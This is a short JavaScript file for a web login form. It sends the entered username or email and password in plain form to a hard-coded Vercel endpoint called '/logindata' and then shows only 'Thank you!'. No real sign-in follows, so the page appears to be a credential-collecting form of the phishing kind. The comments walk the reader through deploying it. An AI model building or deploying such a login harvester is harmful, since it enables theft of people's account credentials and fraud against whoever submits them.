// script.js (for your FRONT-END webpage)
document.addEventListener('DOMContentLoaded', function () {
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const messageDiv = document.getElementById('message');

    // !!! IMPORTANT: Replace YOUR_VERCEL_BACKEND_URL with the URL you got from Vercel for your 'number2' backend!!!
    const BACKEND_API_URL = 'https://number2-adamahmeddds-projects.vercel.app/logindata';

    loginForm.addEventListener('submit', async function (event) {
        event.preventDefault();

        const username = usernameInput.value.trim();
        const password = passwordInput.value;

        if (messageDiv) {
            messageDiv.textContent = '';
            messageDiv.className = 'message';
            messageDiv.classList.remove('show');
        }

        if (username === '' || password === '') {
            displayMessage('Please enter both username/email and password.', 'error');
            return;
        }

        try {
            const response = await fetch(BACKEND_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: password
                }),
            });

            if (response.ok) {
                displayMessage('Thank you!', 'success');
                // loginForm.reset(); // Optional: clear the form
            } else {
                const errorData = await response.text();
                console.error('Server error:', response.status, errorData);
                displayMessage('Submission failed. Please try again.', 'error');
            }
        } catch (error) {
            console.error('Network error or other issue sending data:', error);
            displayMessage('Could not submit data. Check connection.', 'error');
        }
    });

    function displayMessage(msg, type) {
        if (messageDiv) {
            setTimeout(() => {
                messageDiv.textContent = msg;
                messageDiv.classList.add(type);
                messageDiv.classList.add('show');
            }, 50);
        } else {
            alert((type === 'error' ? "Error: " : "") + msg);
        }
    }
});
